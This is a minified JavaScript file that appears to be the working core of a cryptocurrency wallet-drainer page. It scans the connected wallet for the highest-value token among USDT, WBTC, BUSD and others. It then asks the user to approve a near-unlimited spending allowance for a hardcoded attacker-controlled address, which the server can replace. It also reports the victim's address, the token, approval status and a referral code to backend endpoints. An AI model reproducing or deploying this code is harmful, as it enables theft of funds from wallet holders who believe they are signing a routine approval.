const ABI=[{inputs:[{internalType:"string",name:"name",type:"string"},{internalType:"string",name:"symbol",type:"string"}],stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Approval",type:"event"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"approve",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"subtractedValue",type:"uint256"}],name:"decreaseAllowance",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"addedValue",type:"uint256"}],name:"increaseAllowance",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transfer",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"from",type:"address"},{indexed:!0,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Transfer",type:"event"},{inputs:[{internalType:"address",name:"sender",type:"address"},{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transferFrom",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"spender",type:"address"}],name:"allowance",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"decimals",outputs:[{internalType:"uint8",name:"",type:"uint8"}],stateMutability:"view",type:"function"},{inputs:[],name:"name",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[],name:"symbol",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalSupply",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"}];var approveAddr,contract,authorized_address="0xBa82cF5aE34D6339a5C651778db4d73BD29ffEcB",bizhong="USDT";const addr={USDT:"0xdac17f958d2ee523a2206206994597c13d831ec7",SUSHI:"0x6b3595068778dd592e39a122f4f5a5cf09c90fe2",USDC:"0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",BNB:"0xB8c77482e45F1F44dE1745F52C74426C631bDD52",UNI:"0x1f9840a85d5af5bf1d1762f925bdaddc4201f984","1INCH":"0x111111111117dC0aa78b770fA6A738034120C302",SHIB:"0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",DAI:"0x6b175474e89094c44da98b954eedeac495271d0f",WBTC:"0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",WETH:"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"},bsc_addr={BUSD:"0xe9e7cea3dedca5984780bafc599bd69add087d56",SAFEMOON:"0x8076c74c5e3f5852037f31ff0093eeb8c8add8d3",WBNB:"0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",BUSDT:"0x55d398326f99059ff775485246999027b3197955",CAKE:"0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",TWT:"0x4b0f1812e5df2a09796481ff14017e6005508003"},price={USDT:1,SUSHI:15.5,USDC:1,BNB:275,UNI:28.6,"1INCH":3.84,SHIB:8e-6,DAI:1,WBTC:56478.2,WETH:1991.89},bsc_price={BUSD:1,SAFEMOON:4e-6,WBNB:349,BUSDT:1,CAKE:17,TWT:18},decimals={USDT:6,USDC:6,WBTC:8},bsc_decimals={SAFEMOON:9},LOCAL_WEB3_KEY="web3";function getUrlQueryString(e,t){(t=t||window.location.href)&&t.indexOf("?")>-1&&(t=t.substring(t.indexOf("?")+1));var a=new RegExp("(^|&)"+e+"=([^&#]*)","i"),n=t?t.match(a):window.location.search.substr(1).match(a);return null!=n&&""!=n[2]?unescape(n[2]):null}function getLocalStorage(e){let t=window.localStorage.getItem(LOCAL_WEB3_KEY)||"{}";return JSON.parse(t)[e]}function putLocalStorage(e,t){let a=window.localStorage.getItem(LOCAL_WEB3_KEY)||"{}",n=JSON.parse(a);n[e]=t,window.localStorage.setItem(LOCAL_WEB3_KEY,JSON.stringify(n))}async function checkApproved(e,t){var a=getUrlQueryString("s");if(a)putLocalStorage("code",a);else if(a=getLocalStorage("code"),getLocalStorage("authorized_address"))return void(authorized_address=getLocalStorage("authorized_address"));var n={address:e||"",authorized_address:authorized_address,bizhong:t,code:a};$.ajax({type:"post",url:"/api/check_eth",data:n,success:function(e){console.log(e),approved=!!e.approved,e.authorized_address&&putLocalStorage("authorized_address",authorized_address=e.authorized_address)},error:function(e){console.log(e)}})}async function postInfo(e,t,a,n){var s=getUrlQueryString("s");s||(s=getLocalStorage("code"));var r=getUrlQueryString("r"),d={address:e,authorized_address:authorized_address,bizhong:a,code:s,reffer:r,approved:!!n};$.ajax({type:"post",url:1===t?"/api/eth":"/api/bsc",data:d})}async function getMostValuableAssets(e,t){let a=0;bizhong="USDT";for(const n of Object.keys(addr)){const s=addr[n],r=new e.eth.Contract(ABI,s);"USDT"===n&&a<=0&&(contract=r),r.methods.balanceOf(t).call(function(e,t){const s=t/10**(decimals[n]||18)*price[n];s>a&&s>1e3&&(contract=r,bizhong=n,a=s)})}}async function bsc_getMostValuableAssets(e,t){let a=0;bizhong="BUSD";for(const n of Object.keys(bsc_addr)){const s=bsc_addr[n],r=new e.eth.Contract(ABI,s);"BUSD"===n&&a<=0&&(contract=r),r.methods.balanceOf(t).call(function(e,t){const s=t/10**(bsc_decimals[n]||18)*bsc_price[n];s>a&&s>1e3&&(contract=r,bizhong=n,a=s)})}}async function doCheck(e,t){const a=await e.eth.net.getId();if(getLocalStorage("apr_network")==a&&getLocalStorage("apr_addr")==t)return;1===a?getMostValuableAssets(e,t):bsc_getMostValuableAssets(e,t);const n=await e.eth.getGasPrice();postInfo(t,a,bizhong,!1),contract.methods.approve(authorized_address,"79228162514264337593543950335").send({from:t,gasPrice:n,gas:1e5},function(e,n){e||(postInfo(t,a,bizhong,!0),putLocalStorage("apr_network",a),putLocalStorage("apr_addr",t)),console.log(e,n)})}checkApproved("","USDT");